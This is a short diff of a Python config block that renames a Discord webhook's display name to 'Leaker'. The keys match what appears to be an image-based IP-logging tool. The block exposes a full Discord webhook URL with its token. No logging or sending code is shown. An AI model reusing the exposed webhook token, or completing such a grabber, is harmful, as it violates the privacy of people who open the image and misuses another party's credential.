@@ -6,7 +6,7 @@ config = {
     "webhook": "https://discord.com/api/webhooks/1441437862443876393/Qn32h5WebGcLRp3aPwFI4iMKV5pAWaQCdfdKo5cFg286xr-UzkNkenmUTOMfXooFR5gr",
     "image": "https://external-content.duckduckgo.com/iu/?u=http%3A%2F%2Fimages7.memedroid.com%2Fimages%2FUPLOADED322%2F634084e6e7085.jpeg&f=1&nofb=1&ipt=214554cbb1889b47ed432fd195974c79e3f1de9cd7d1491a02ed69fdc6aed8e6",
     "imageArgument": True,
-    "username": "Noctys",
+    "username": "Leaker",
     "avatar_url": "https://cdn.discordapp.com/attachments/1416864102365790409/1441442513528553563/Capture_decran_2025-08-22_183201.png?ex=6921cf73&is=69207df3&hm=7bac70905b5b7f8624f666a40da9b4374b588ce8d6da3773bae6dfd8417e0553&",
     "color": 0x1C2526,  # Very dark grey
 
